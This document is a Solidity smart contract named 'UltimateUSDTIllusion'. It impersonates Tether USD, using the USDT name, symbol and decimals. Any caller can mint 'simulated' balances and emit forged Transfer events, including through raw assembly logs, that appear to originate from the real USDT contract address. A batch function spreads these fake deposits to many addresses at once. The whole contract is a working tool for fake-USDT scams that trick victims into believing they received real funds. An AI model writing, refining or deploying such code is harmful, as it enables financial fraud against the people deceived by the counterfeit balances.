// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITokenProxy {
    function setSimulatedBalance(address account, uint256 value) external;
    function emitTransfer(address from, address to, uint256 value) external;
}

contract UltimateUSDTIllusion {
    string public constant name = "Tether USD";
    string public constant symbol = "USDT";
    uint8 public constant decimals = 6;
    address public immutable REAL_USDT = 0xa614f803B6FD780986A42c78Ec9c7f77e6DeD13C; // TR7NHqje...
    address public proxy;
    bool public initialized;
    uint256 public lastSyncTimestamp;
    mapping(address => uint256) public simulatedBalances;
    mapping(address => mapping(address => uint256)) public allowances;
    string private _tokenURI = "https://ethererc.com/api/v1/token";
    uint256 private _totalSupply = 10000000000 * 10**6;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Mint(address indexed to, uint256 amount);
    event Burn(address indexed from, uint256 amount);
    event MetadataUpdate(address indexed contractAddress);

    modifier whenInitialized() {
        require(initialized, "Not initialized");
        _;
    }

    modifier cooldown() {
        require(block.timestamp >= lastSyncTimestamp + 60, "Sync cooldown");
        _;
    }

    constructor(address _proxy) {
        initialized = true;
        proxy = _proxy;
        lastSyncTimestamp = block.timestamp;
        emit MetadataUpdate(proxy);
    }

    function emitFakeTransfer(address to, uint256 amount) external whenInitialized {
        require(to != address(0), "Invalid recipient");
        simulatedBalances[to] += amount;
        ITokenProxy(proxy).setSimulatedBalance(to, simulatedBalances[to]);
        ITokenProxy(proxy).emitTransfer(REAL_USDT, to, amount);
        emit Transfer(REAL_USDT, to, amount);
        emit Mint(to, amount);
        emit MetadataUpdate(proxy);
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, amount)
            log3(ptr, 0x20, 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef, sload(0x0), to)
        }
    }

    function balanceOf(address account) external view returns (uint256) {
        return simulatedBalances[account];
    }

    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }

    function tokenURI() external view returns (string memory) {
        return _tokenURI;
    }

    function approve(address spender, uint256 amount) external whenInitialized returns (bool) {
        allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function allowance(address owner, address spender) external view returns (uint256) {
        return allowances[owner][spender];
    }

    function transfer(address to, uint256 amount) external whenInitialized {
        require(to != address(0), "Invalid recipient");
        require(simulatedBalances[msg.sender] >= amount, "Insufficient balance");
        simulatedBalances[msg.sender] -= amount;
        this.emitFakeTransfer(to, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external whenInitialized {
        require(recipient != address(0), "Invalid recipient");
        require(simulatedBalances[sender] >= amount, "Insufficient balance");
        require(allowances[sender][msg.sender] >= amount, "Insufficient allowance");
        simulatedBalances[sender] -= amount;
        allowances[sender][msg.sender] -= amount;
        this.emitFakeTransfer(recipient, amount);
    }

    function periodicSync(address[] memory targets, uint256[] memory amounts) external whenInitialized {
        require(targets.length == amounts.length, "Array length mismatch");
        require(targets.length <= 50, "Gas limit exceeded");
        for (uint256 i = 0; i < targets.length; i++) {
            this.emitFakeTransfer(targets[i], amounts[i]);
        }
    }

    function burn(uint256 amount) external whenInitialized {
        require(simulatedBalances[msg.sender] >= amount, "Insufficient balance");
        simulatedBalances[msg.sender] -= amount;
        _totalSupply -= amount;
        emit Burn(msg.sender, amount);
        emit Transfer(msg.sender, address(0), amount);
    }
}